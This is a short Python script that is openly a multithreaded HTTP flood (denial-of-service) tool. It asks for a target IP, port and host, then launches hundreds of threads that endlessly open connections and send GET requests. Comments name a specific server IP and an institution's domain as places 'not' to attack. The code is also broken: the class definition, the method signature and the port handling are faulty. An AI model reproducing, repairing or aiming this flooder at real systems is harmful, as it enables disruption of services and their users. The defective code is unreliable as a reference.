#just in case you are using it for eduserver or something please dont
#eduserver IP address = 103.241.136.151

import socket
import threading
import sys, os, time, shodan


class Dedos(target,port,host):
    def __init__(self,target,port,host):
        self.target = target
        self.port = port
        self.host = host
    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target,port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
            s.sendto(("Host: " + host + "\r\n\r\n").encode('ascii'), (target,port))
            s.close()

print("\n\n\n Dont try this on eduserver or nitc.ac.in please :) \n\n\n ")
target = str(input("Target IP : "))
port = input("port : ")
host= str(input("Host IP : "))

dummy = Dedos(target,port,host)

#threads

n = int(input("No of threads to be used(suggested 500) :"))

for i in range(n):
    thread = threading.Thread(target=dummy.attack)
    thread.start()
